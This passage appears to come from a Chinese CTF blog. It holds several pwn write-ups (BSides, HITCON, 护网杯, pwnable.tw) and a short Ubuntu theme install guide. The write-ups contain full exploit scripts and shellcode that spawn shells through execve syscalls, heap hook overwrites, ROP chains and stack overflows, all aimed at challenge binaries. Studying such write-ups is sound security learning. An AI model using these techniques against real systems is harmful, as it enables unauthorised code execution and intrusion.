1 A 终端挂起或者控制进程终止 SIGINT 2 A 键盘中断（如break键被按下） SIGQUIT 3 C 键盘的退出键被按下 SIGILL 4 C 非法指令 SIGABRT 6 C 由abort(3)发出的退出指令 SIGFPE 8 C 浮点异常 SIGKILL 9 AEF Kill信号 SIGSEGV 11 C 无效的内存引用 SIGPIPE 13 A 管道破裂: 写一个没有读端口的管道 SIGALRM 14 A 由alarm(2)发出的信号 SIGTERM 15 A 终止信号 SIGUSR1 30,10,16 A 用户自定义信号1 SIGUSR2 31,12,17 A 用户自定义信号2 SIGCHLD 20,17,18 B 子进程结束信号 SIGCONT 19,18,25 进程继续（曾被停止的进程） SIGSTOP 17,19,23 DEF 终止进程 SIGTSTP 18,20,24 D 控制终端（tty）上按下停止键 SIGTTIN 21,21,26 D 后台进程企图从控制终端读 SIGTTOU 22,22,27 D 后台进程企图从控制终端写 handler函数 void handler() { exec_syscall_obj(&amp;obj); } __int64 __fastcall exec_syscall_obj(_QWORD *a1) { _QWORD *v1; // rbx __int64 result; // rax __int64 v3; // rdi __int64 v4; // rsi __int64 v5; // rdx __int64 v6; // rcx __int64 v7; // r8 __int64 v8; // r9 v1 = a1; result = *a1; v3 = a1[1]; v4 = v1[2]; v5 = v1[3]; v6 = v1[4]; v7 = v1[5]; v8 = v1[6]; __asm { syscall; LINUX - } return result; }//exec_syscall_obj就是根据输入的寄存器的值执行了一次syscall 做法一: 构造execve(“/bin/sh”,0,0)的syscall来getshell 做法二： 构造open(),read(),write()这三个函数的系统调用，打开flag文件，读取flag，再打印出来 ps：这是我看大佬的writeup看到的 大佬博客地址 大佬都是手撕汇编的存在。tkbl open的系统调用号为 2，write的调用号为1，read的调用号为0 寄存器对应参数 open： rax-&gt; 0x2 ; rdi-&gt;pathname ; rsi​-&gt;flags read: rax-&gt;0x0 ; rdi-&gt;fd ; rsi-&gt;buf ; rdx-&gt;count write: rax-&gt;0x1 ; rdi-&gt;fd ; rsi-&gt;buf ; rdx-&gt;count 先通过调用read的syscall将 pathname写入bss段，然后用open打开文件，再通过read将文件内容读到bss段，最后通过write打印出来 我用的是做法一： execve()的syscall rax : 0x3b rdi : address of “/bin/sh\x00” rsi : 0 rdx : 0 exp: #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./easypeasy&#39;) elf = ELF(&#39;./easypeasy&#39;) else: p = remote(&quot;35.200.228.122&quot;,1337) elf = ELF(&#39;./easypeasy&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def register(rax,rdi,rsi,rdx,rcx,r8,r9): p.sendlineafter(&#39;RAX: &#39;, rax) p.sendlineafter(&#39;RDI: &#39;, rdi) p.sendlineafter(&#39;RSI: &#39;, rsi) p.sendlineafter(&#39;RDX: &#39;, rdx) p.sendlineafter(&#39;RCX: &#39;, rcx) p.sendlineafter(&#39;R8: &#39;, r8) p.sendlineafter(&#39;R9: &#39;, r9) register(str(0x3b),str(0x6010A0 + 0x30),str(0x0),str(0x0),str(0),str(0),str(u64(&#39;/bin/sh\x00&#39;))) sleep(30) #这里sleep(30)的原因是为了等程序执行 alarm(0x1e)，产生SIGALRM信号 p.interactive() canarysmash the stack，利用__stack_chk_failed函数，打印出flag exp： from pwn import* #p = process(&#39;./canary&#39;) p = remote(&quot;35.200.232.80&quot;,&quot;1337&quot;) context.log_level=&quot;debug&quot; flag = 0x06010A0 p.recv() payload = &#39;a&#39;*0x178 + p64(flag) p.sendline(payload) p.recv() p.interactive() data_bank防护机制： ☁ data_bank checksec data_bank [*] &#39;/home/zs0zrc/pwn/ BSides/data_bank/data_bank&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 这道题是一道堆的UAF的利用，但是libc版本是2.26，有tcache机制…….做的时候没有发现，虽然他给了libc文件，但是没有去检查libc的版本，下次一定记得去检查libc版本。而且不知道为什么我Ubuntu16.04不能运行他给的libc文件，所以我用的环境是Ubuntu18.04 程序一共有5个功能 add 新建一个chunk edit 编辑chunk delete free掉一个chunk，但是没有将指针置为空 view 将chunk的内容打印出来 exit 退出 漏洞点 int delete() { int result; // eax int v1; // eax signed int v2; // [rsp+Ch] [rbp-4h] puts(&quot;Enter the index:&quot;); result = get_int(); v2 = result; while ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 6 ) { if ( !table[v2] ) return puts(&quot;The index is empty&quot;); v1 = count--; if ( v1 ) { free(table[v2]);//存在UAF漏洞 return puts(&quot;done&quot;); } result = puts(&quot;Sorry no more removal\n&quot;); } return result; } 利用思路： 先利用view功能泄露出libc地址，然后通过UAF 加上tcache_posion分配到包含_malloc_hook的chunk，修改 __malloc_hook为one_gadget，最后再malloc一个chunk触发 malloc_hook来getshell。这里要注意的是因为有tcache机制，所以要先将tcache填满，才可以泄露出地址。 exp: from pwn import* context.log_level = &quot;debug&quot; p = process(&quot;./data_bank&quot;, env = {&#39;LD_PRELOAD&#39;: &#39;./libc.so.6&#39;}) elf = ELF(&#39;./data_bank&#39;) libc = ELF(&#39;./libc.so.6&#39;) def add(idx,size,data): p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;) p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx)) p.sendlineafter(&quot;Enter the size:\n&quot;,str(size)) p.sendlineafter(&quot;Enter data:\n&quot;,data) def delete(idx): p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;) p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx)) def edit(idx,data): p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;) p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx)) p.sendlineafter(&quot;Please update the data:\n&quot;,data) def show(idx): p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;4&quot;) p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx)) add(0,0x80,&#39;a&#39;*0x80) add(1,0x80,&#39;b&#39;*0x80) for i in range(7): # 填满tcache delete(1) delete(0) show(0) p.recvuntil(&quot;:&quot;) leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) libc_base = leak - 0x3ebca0 libc.address = libc_base __malloc_hook_add = libc.symbols[&#39;__malloc_hook&#39;] one_gadget = libc_base + 0x10a38c log.info(&quot;libc_address {}&quot;.format(hex(libc_base))) add(2,0x60,&#39;a&#39;*0x60) delete(2) edit(2,p64(__malloc_hook_add-0x13)) add(3,0x60,&quot;b&quot;*0x60) add(4,0x60,&#39;a&#39;*0x13 + p64(one_gadget)) log.info(&quot;get shell&quot;) p.sendlineafter(&#39;&gt;&gt; &#39;, &#39;1&#39;) p.sendlineafter(&#39;Enter the index:\n&#39;, &#39;5&#39;) p.sendlineafter(&#39;Enter the size:\n&#39;, &#39;0&#39;) p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HitconCTF 复现]]></title>
    <url>%2F2018%2F10%2F23%2F2018-10-23-HitconCTF-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[toooo这道题是我在苦逼的写完了社会实践报告后刷D4rk3r大佬的博客看到的，感觉很有意思，就先看了这道题 这题是一道arm的pwn，可是它被分类到了misc，可能大佬觉得这是脑洞题吧 查看了下程序的架构 ☁ tooooo file tooooo tooooo: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=9e7e0f87a22c5b75cb0926d54d3d3f33fbac1fad, stripped 这是一道arm64的题，先配置下虚拟机的环境 ☁ tooooo apt-cache search &quot;libc6&quot; | grep arm64 libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) libc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (for cross-compiling) ☁ tooooo sudo apt-get install libc6-arm64-cross 因为题目给了libc文件和ld所以用题目给的就行了，运行前需要将ld-2.27.so重命名为ld-linux-aarch64.so.1 以及将libc-2.27.so重命名为libc.so.6 将重命名的文件放入lib文件夹，lib文件夹放在和程序同个目录下 qemu-aarch64 -L ./ tooooo 简单运行下发现它打印出了一个地址，然后要输入一个字符串，最后在打印一个字符串退出了 ☁ tooooo qemu-aarch64 -L ./ tooooo 0x40009b1560 fasdf Too many :) 用ida查看了下反编译的伪代码 __int64 vuln() { unsigned int v1; // [xsp+18h] [xbp+18h] __int64 v2; // [xsp+20h] [xbp+20h] void (__fastcall *v3)(_QWORD, __int64, __int64, __int64); // [xsp+28h] [xbp+28h] __int64 v4; // [xsp+30h] [xbp+30h] __int64 v5; // [xsp+38h] [xbp+38h] v3 = &amp;unk_F40; init_fuc(); v1 = open(&quot;/dev/urandom&quot;, 0LL); if ( (v1 &amp; 0x80000000) != 0 ) _exit(0xFFFFFFFFLL); v2 = 0LL; if ( read(v1, &amp;v2, 4LL) &lt;= 0 ) return v5 ^ _stack_chk_guard; printf(&quot;0x%llx\n&quot;, stdout); v4 = mmap(v2 &amp; 0x7FFFF000, 12288LL, 3LL, 34LL, 0xFFFFFFFFLL, 0LL); if ( v4 == -1 ) _exit(0xFFFFFFFFLL); if ( read(v1, v4, 12288LL) &lt;= 0 ) _exit(4294967294LL); get_string(&amp;unk_12018, 0x30u); v3(v1, v4 + 0x2000, write_1, write_2); return v5 ^ _stack_chk_guard; } 这里可以发现，它将stdout的地址打印出来了，所以可以计算出libc的地址。然后它往&amp;unk_12018写入0x30个字节的内容,通过这个可以将在bss段上的 write_1和write_2两个函数指针给覆盖掉，而这两个函数在后面都会执行，所以这里可以获得两次调用函数的机会，但是要怎么getshell呢。这里我看到大佬们用了一个很骚的函数 getusershell()，先执行getusershell()函数，将”/bin/sh”存储在x0寄存器中，然后再执行system函数 arm64的调用约定:参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。 exp: #!/usr/bin/env python from pwn import * local = 0 debug = 0 if local: if debug: p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;tooooo&quot;]) else: p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;tooooo&quot;]) else: p = remote(&quot;13.230.48.252&quot;,&quot;4869&quot;) elf = ELF(&quot;tooooo&quot;) libc = ELF(&quot;./lib/libc.so.6&quot;) context.binary = &quot;tooooo&quot; context.log_level = &quot;debug&quot; libc_base = int(p.recvline().strip(&quot;\n&quot;),16) - libc.symbols[&#39;_IO_2_1_stdout_&#39;] print hex(libc_base) libc.address = libc_base payload = &#39;a&#39;*0x20 + p64(libc.symbols[&quot;getusershell&quot;]) + p64(libc.symbols[&quot;system&quot;]) p.sendline(payload) p.interactive() reference: D4rk3r大佬的writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[护网杯wp及复现]]></title>
    <url>%2F2018%2F10%2F16%2F2018-10-14-%E6%8A%A4%E7%BD%91%E6%9D%AFwp%E5%8F%8A%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[昨天刚打完护网杯线上赛，被自己菜哭，菜的真实，所以现在来赛后复现了 start签到题，就是覆盖栈上的变量为特定的值，有点新奇的就是有一个变量要覆盖成小数0.1 0.1 在内存中存储形式为 0x3fb999999999999a exp： #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./gettingstart&#39;) elf = ELF(&#39;./gettingstart&#39;) libc = elf.libc else: host = &#39;49.4.94.186&#39; port = &#39;32680&#39; p = remote(host,port) elf = ELF(&#39;./gettingstart&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; p.recvuntil(&quot;you.\n&quot;) payload = &quot;1&quot;*0x18+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3fb999999999999a) p.send(payload) p.interactive() shopping很气人 ，我离做出就差一个__free_hook 防护机制： ☁ shopping checksec shopping [*] &#39;/home/zs0zrc/game/huwangbei/PWN/shopping /shopping&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 通过ida分析下程序逻辑 大致有两个功能 get_monye 获得money buy 购买物品 unsigned __int64 getmoney() { unsigned __int64 v0; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); while ( 1 ) { while ( 1 ) { puts(&quot;EMMmmm, you will be a rich man!&quot;); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); if ( v0 != 2 ) break; puts_something(); } if ( v0 == 3 ) break; if ( v0 == 1 ) get_money(); } return __readfsqword(0x28u) ^ v3; } 然后buy中又存在三个功能 get_goods 获得商品 delete_goods 删除商品 edit_goods 编辑商品 unsigned __int64 buy() { unsigned __int64 v0; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); do { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(&quot;Now, buy buy buy!&quot;); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); if ( v0 != 2 ) break; free_goods(); } if ( v0 &gt; 2 ) break; if ( v0 == 1 ) get_goods(); } if ( v0 != 3 ) break; edit_goods(); } } while ( v0 != 4 ); return __readfsqword(0x28u) ^ v3; } 这道题目的漏洞在edit_goods函数中，它用strtoul函数来获取商品的下标 它的函数原型是 unsigned long strtoul (const char* str, char** endptr, int base); endstr 为第一个不能转换的字符的指针，base 为字符串 str 所采用的进制。 strtoul() 会扫描参数 str 字符串，跳过前面的空白字符 漏洞点 idx = strtoul(&amp;s, 0LL, 0); printf(&quot;OK, what would you like to modify %s to?\n&quot;, *buy_array[idx], idx); *(*buy_array[v1] + read(0, *buy_array[v1], 8uLL)) = 0; //没有对输入的值的下限进行检查，可以读取一个负数，造成数组下标溢出 泄露信息只要先生成一个unsorted bin大小的chunk，然后delete它，再malloc(0)，就可以泄露出libc的信息 这里要借助get_money中生成的两个数组来实现任意地址写，因为edit功能是通过二重引用指针，修改的是buy_array[idx]的内容指向的地址上的内容，而money_array数组中存储着array数组的地址，所以我们修改edit_goods修改money_array的内容，在array中布置我们想要修改的地址，最后再修改array对应的位置， 就可以实现任意地址写 if ( counts_g &lt;= 0x13 ) { puts(&quot;I will give you $9999, but what&#39;s the currency type you want, RMB or Dollar?&quot;); v1 = malloc(0x10uLL); v2 = v1; v1[1] = 0x270FLL; fgets(&amp;array[8 * counts_g], 8, stdin); *v2 = &amp;array[8 * counts_g]; v3 = counts_g++; v4 = 8 * v3; v0 = &amp;money_array; *(&amp;money_array + v4) = v2; } 这里我看writeup看到很多种做法， 改__free_hook为system,再free掉一个包含”sh”字符串的chunk 改libc里面的 malloc@got为one_gadget，然后再生成一个chunk就可以getshell，但是这个libc中的got表我在网上怎么都查不到，真的是学到了 还有一种没有用到chunk的，直接就数组下标溢出做的wirteup 各位师傅真的是tql，我的exp用的是第一种 exp: #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./shopping&#39;) elf = ELF(&#39;./shopping&#39;) libc = elf.libc else: host = &#39;117.78.26.200&#39; port = &#39;32599&#39; p = remote(host,port) elf = ELF(&#39;./shopping&#39;) libc = ELF(&#39;./libc6_2.23-0ubuntu10_amd64.so&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16) log.info(&quot;text_base:{}&quot;.format(hex(text_base))) log.info(&quot;buy_array:{}&quot;.format(hex(text_base + 0x2021E0))) log.info(&quot;get_array:{}&quot;.format(hex(text_base + 0x202140))) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) def get_money(): ru(&quot;EMMmmm, you will be a rich man!\n&quot;) for i in range(0x14): sl(&#39;1&#39;) rc() sl(&#39;1234&#39;) ru(&quot;EMMmmm, you will be a rich man!\n&quot;) sl(&#39;3&#39;) def buy_goods(size,name): ru(&#39;Now, buy buy buy!\n&#39;) sl(&#39;1&#39;) ru(&#39;How long is your goods name?\n&#39;) sl(str(size)) ru(&#39; name?\n&#39;) sl(name) def edit_goods(idx,name): rc() sl(&#39;3&#39;) rc() sl(idx) ru(&quot; to?\n&quot;) sd(name) def delete_goods(idx): rc() sl(&#39;2&#39;) rc() sl(str(idx)) get_money() buy_goods(0x88,&#39;a&#39;*8)#0 buy_goods(0x88,&#39;sh&#39;)#1 buy_goods(0x88,&#39;a&#39;*8)#2 delete_goods(0) buy_goods(0,&#39;&#39;) pause() log.info(&quot;---------leak libc-----------&quot;) rc() sl(&#39;3&#39;) rc() sl(&#39;3&#39;) ru(&quot;modify &quot;) leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) libc_base = leak - libc.symbols[&#39;__malloc_hook&#39;] - 0x10- 216 libc.address = libc_base print hex(leak) print hex(libc_base) sl(&#39;aaaaa&#39;) rc() edit_goods(&#39; -1&#39;,p64(libc.got[&#39;__free_hook&#39;])) edit_goods(&#39; -21&#39;,p64(libc.symbols[&#39;system&#39;])) delete_goods(1) p.interactive() huwang防护机制： ☁ huwang checksec huwang [*] &#39;/home/zs0zrc/game/huwangbei/PWN/huwang/huwang&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 这题看起来像是堆的题，但其实堆分配的部分都没用，主要的功能集中在选项666中 它先打开secret文件，往里面写入随机数，然后输入md5加密的次数，循环加密后将结果存入secret中，然后要我们猜在secret存储的md5值。程序在写入md5结果时会先清空文件的内容，并且如果它没对输入的数字的下限进行判断，所以可以输入一个”-1”，程序就会循环执行MD5直到超时杀死自己，导致sercet文件的内容为空。那么md5的值就是可以预测的，16个null的md5也就是 0x000000000000000的MD5 —-&gt;[4ae71336e44bf9bf79d2752e234818a5] 同时name填0x19个字符可以泄漏出canary ，md5猜成功后会进入success函数，这里存在一个栈溢出，是由snprintf函数造成的，snprintf函数返回的值是想要写入的值，知道了canary就可以用ROP了，先泄露出libc地址，然后构造rop链调用system函数 int __fastcall sub_40101C(__int64 a1) { char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char v4; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf(&quot;Congratulations, %s guessed my secret!\n&quot;, a1); puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;); puts(&quot;What`s your occupation?&quot;); sub_400CC1(&amp;v4, 255LL); v3 = snprintf( &amp;s, 0xFFuLL, &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot; &quot;..................................................................................... ............&quot;, a1, &amp;v4); puts(&quot;Here is your introduce&quot;); puts(&amp;s); puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;); v1 = getchar(); getchar(); if ( v1 == &#39;Y&#39; ) read(0, &amp;s, v3 - 1); //stack overflow return printf(&quot;The final presentation is as follows:%s\n&quot;, &amp;s); } exp: #!/upr/bin/env python from pwn import * p = process(&#39;./huwang&#39;) elf = ELF(&#39;./huwang&#39;) libc = elf.libc context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def prepare(): p.sendlineafter(&quot;command&gt;&gt; \n&quot;,&#39;666&#39;) p.sendlineafter(&quot;name\n&quot;,&#39;a&#39;*0x8) p.sendlineafter(&quot;secret?\n&quot;,&quot;y&quot;) p.sendlineafter(&quot;secret:\n&quot;, &#39;-1&#39;) p.recvuntil(&#39;timeout~&#39;) def expoit(): p = process(&#39;./huwang&#39;) p.sendlineafter(&quot;command&gt;&gt; \n&quot;,&#39;666&#39;) p.sendafter(&quot;name\n&quot;,&#39;a&#39;*0x18+&quot;#&quot;) p.sendlineafter(&quot;secret?\n&quot;,&quot;y&quot;) p.sendlineafter(&quot;secret:\n&quot;, &#39;1&#39;) p.sendafter(&#39;secret\n&#39;, &quot;J\xe7\x136\xe4K\xf9\xbfy\xd2u.#H\x18\xa5&quot;) p.recvuntil(&quot;#&quot;) canary = u64(&#39;\0&#39; + p.recv(7)) print hex(canary) p.recvuntil(&quot;occupation?\n&quot;) p.send(&#39;a&#39;*0xff) p.sendlineafter(&quot;[Y/N]\n&quot;,&quot;Y&quot;) pop_rdi = 0x401573 leave_ret = 0x400d45 ret = 0x40101C ropchain = &#39;a&#39;*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got[&#39;puts&#39;])+ p64(ret) p.sendline(ropchain) p.recvuntil(&quot;Congratulations, &quot;) libc_base = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;puts&#39;] libc.address = libc_base payload = &#39;a&#39;*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(libc.search(&#39;/bin/sh&#39;).next()) + p64(libc.symbols[&#39;system&#39;]) p.recvuntil(&quot;occupation?\n&quot;) p.send(&#39;a&#39;*0xff) p.sendlineafter(&quot;[Y/N]\n&quot;,&quot;Y&quot;) p.sendline(payload) p.interactive() prepare() expoit() 被23R3F大佬鞭策，回来把剩下的两道题复现下 six大佬们的writeup： 23R3F 防护机制： ☁ six checksec six [*] &#39;/home/zs0zrc/pwn/huwangbei/six/six&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖入ida简单逆向下,程序一开始先用mmap分配了两个区域 unsigned __int64 init_fuc() { int fd; // ST04_4 __int64 buf; // [rsp+8h] [rbp-18h] __int64 v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;buf, 6uLL); read(fd, &amp;v3, 6uLL); text = mmap((v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL); //text段具有rwx权限，用来存放要执行的代码 stacks = mmap((buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500; //stacks用来模拟栈 //这里分配的空间，当两个地址冲突或者不符合条件时，就会随机分配，随机分配的两个区域是相邻的，相邻时stacks与text的距离为0xb00 return __readfsqword(0x28u) ^ v4; } 然后输入6个字节的shellcode,将shellcode放入text中，且shellcode要满足三个奇数，三个偶数 __int64 __fastcall sub_B05(__int64 a1) { __int64 result; // rax unsigned int v2; // [rsp+10h] [rbp-10h] int v3; // [rsp+14h] [rbp-Ch] signed int i; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] v2 = 0; v3 = 0; for ( i = 0; i &lt;= 5; ++i ) { if ( *(i + a1) &amp; 1 ) ++v2; else ++v3; for ( j = i + 1; j &lt;= 5; ++j ) { if ( *(i + a1) == *(j + a1) ) { puts(&quot;Invalid shellcode!&quot;); exit(0); } } } result = v2; if ( v2 == v3 ) return result; puts(&quot;Invalid shellcode!&quot;); exit(0); return result; } 在执行我们输入的shellcode前，程序会先执行一段代码 Disassembly: 0: 48 89 fc mov rsp,rdi 3: 48 31 ed xor rbp,rbp 6: 48 31 c0 xor rax,rax 9: 48 31 db xor rbx,rbx c: 48 31 c9 xor rcx,rcx f: 48 31 d2 xor rdx,rdx 12: 48 31 ff xor rdi,rdi 15: 48 31 f6 xor rsi,rsi 18: 4d 31 c0 xor r8,r8 1b: 4d 31 c9 xor r9,r9 1e: 4d 31 d2 xor r10,r10 21: 4d 31 db xor r11,r11 24: 4d 31 e4 xor r12,r12 27: 4d 31 ed xor r13,r13 2a: 4d 31 f6 xor r14,r14 2d: 4d 31 ff xor r15,r15 这是从src变量中提出出来的，这里做的就是将rsp指向mmap出来用作栈的空间，然后将各个寄存器清零。 因为这里将rax置0了，所以如果进行syscall的话就会调用read函数，往stack上写入内容。如果此时stacks和text是mmap随机分配的，那么这两个区域会是相邻的，stacks在低地址。从rsp开始覆写，可以覆盖代码段。 调用read函数的shellcode 0: 54 push rsp 1: 5e pop rsi 2: 89 f2 mov edx,esi 4: 0f 05 syscall exp： #!/usr/bin/env python from pwn import * elf = ELF(&#39;./six&#39;) libc = elf.libc context.arch = elf.arch context.log_level=&#39;debug&#39; def exploit(): p = process(&#39;./six&#39;) shellcode1=&#39;&#39;&#39;push rsp;pop rsi;mov edx,esi;syscall&#39;&#39;&#39; p.sendafter(&#39;:&#39;,asm(shellcode1)) paylaod =&#39;\x90&#39;*0xb36+asm(shellcraft.sh()) p.send(paylaod) p.interactive() while 1: try: exploit() except Exception: pass calender待填 大佬们的writeup 天枢 Whitzard 师傅的writeup 大佬的writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu主题Flatabulous安装]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-Ubuntu%E4%B8%BB%E9%A2%98Flatabulous%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[最近看到一个超好看的Ubuntu主题 —-&gt; Flatabulous 大致长这样子，我的Ubuntu版本是 16.04 ，所以之前的ubuntu-tweak就没用了， 我改用gnome-tweak-tool 首先装一个 gnome-tweak-tool sudo apt-get install gnome-tweak-tool 然后安装Flatabulous这个主题 第一种方法： sudo add-apt-repository ppa:noobslab/themes sudo apt-get update sudo apt-get install flatabulous-theme 第二种方法： sudo chown $USER:$USER -R /usr/share/themes/ sudo chmod 755 -R /usr/share/themes/ cd /usr/share/themes/ git clone https://github.com/anmoljagetia/Flatabulous 安装ultra-flat-icons sudo add-apt-repository ppa:noobslab/icons sudo apt-get update sudo apt-get install ultra-flat-icons 然后用gnome-tweak-tool配置 ​ 最后就可以看到超酷的界面了，如果没有变化的话重启一下就可以看到了]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw writeup]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-pwnable.tw-writeup%2F</url>
    <content type="text"><![CDATA[start 防护机制： 0 % checksec start [*] &#39;/home/zs0zrc/pwn/pwnable.tw/start/start&#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 用ida看了下程序，发现只有十几行汇编代码 .text:08048060 ; =============== S U B R O U T I N E ======================================= .text:08048060 .text:08048060 .text:08048060 public _start .text:08048060 _start proc near .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push &#39;:FTC&#39; .text:08048073 push &#39; eht&#39; .text:08048078 push &#39; tra&#39; .text:0804807D push &#39;ts s&#39; .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 14h ; len .text:0804808B mov bl, 1 ; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch .text:08048095 mov al, 3 .text:08048097 int 80h ; LINUX - .text:08048099 add esp, 14h .text:0804809C retn .text:0804809C _start endp ; sp-analysis failed .text:0804809C .text:0804809D .text:0804809D ; =============== S U B R O U T I N E ======================================= 这里实现了wirte 和read的系统调用，在调用read时存在栈溢出。看到防护机制后想到的做法就是 往栈上写shellcode，然后执行shellcode。具体要先泄露stack的地址，然后往栈上写shellcode再覆盖返回地址为shellcode的地址，最后跳转去执行shellcode exp： from pwn import* context.log_level = &#39;debug&#39; #p = remote(&#39;chall.pwnable.tw&#39;,10000) p = process(&#39;./start&#39;) shellcode =&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;\ &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;\ &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;\ &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot; p.recv() payload = &#39;a&#39;*0x14 + p32(0x08048087)#write p.send(payload) leak = u32(p.recv(4)) stack = leak + 0x10 print &quot;leak_stack --&gt;[%s]&quot;%hex(leak_stack) p.send(&#39;a&#39;*0x14+p32(leak_stack+0x4)+shellcode) p.interactive() orw 这题之前做过类似的 ，就是HITCON-Training-master的lab2 这题也是要执行shellcode，不过它限制了可以执行的函数，要求用open read和write 3个函数来读取flag 我拿以前的脚本改了下就打通了 exp: #!/usr/bin/env python # -*-: coding: UTF-8 -*- from pwn import* context.log_level = &#39;debug&#39; #p = process(&#39;./orw&#39;) p = remote(&#39;chall.pwnable.tw&#39;,10001) shellcode = &#39;&#39;&#39; mov eax,0x5 push 0x6761 push 0x6c662f77 push 0x726f2f65 push 0x6d6f682f mov ebx,esp xor ecx,ecx int 0x80 mov eax,0x3 mov ecx,ebx mov ebx,0x3 mov dl,0x30 int 0x80 mov eax,0x4 mov bl,0x1 int 0x80 &#39;&#39;&#39; payload = asm(shellcode) p.recv() p.send(payload) p.interactive() 